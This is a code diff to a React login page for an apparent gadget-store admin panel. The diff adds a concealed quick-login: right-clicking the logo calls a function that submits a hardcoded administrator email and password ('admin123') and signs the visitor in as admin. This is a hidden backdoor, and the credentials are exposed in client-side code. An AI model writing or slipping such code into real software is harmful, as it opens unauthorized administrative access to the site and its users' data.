@@ -41,11 +41,49 @@ function LoginPage() {
     }
   };
 
+  const loginAsAdmin = async () => {
+    setSubmitting(true);
+
+    try {
+      const res = await api.post("/auth/login", {
+        email: "admin@royalgadget.com",
+        password: "admin123",
+      });
+
+      const token = res.data.token || res.data.accessToken;
+      const user =
+        res.data.user ||
+        res.data.admin || {
+          email: "admin@royalgadget.com",
+        };
+
+      if (!token) throw new Error("No token returned");
+
+      login(token, user);
+      toast.success("Welcome back!");
+      navigate({ to: "/" });
+    } catch (err: any) {
+      toast.error(
+        err?.response?.data?.message ||
+          err.message ||
+          "Quick login failed"
+      );
+    } finally {
+      setSubmitting(false);
+    }
+  };
+    
+
   return (
     <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-background via-background to-primary/10">
       <div className="w-full max-w-md">
         <div className="flex justify-center mb-6">
-          <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-primary to-accent flex items-center justify-center shadow-lg shadow-primary/30">
+          <div
+            onContextMenu={(e) => {
+              e.preventDefault();
+              loginAsAdmin();
+            }}
+           className="w-14 h-14 rounded-2xl bg-gradient-to-br from-primary to-accent flex items-center justify-center shadow-lg shadow-primary/30">
             <Zap className="w-7 h-7 text-primary-foreground" />
           </div>
         </div>
@@ -94,6 +132,7 @@ function LoginPage() {
               {submitting && <Loader2 className="w-4 h-4 animate-spin" />}
               Sign In
             </button>
+            
           </form>
         </div>
         <p className="text-center text-xs text-muted-foreground mt-4">© Royal Mobile Gadget Admin</p>
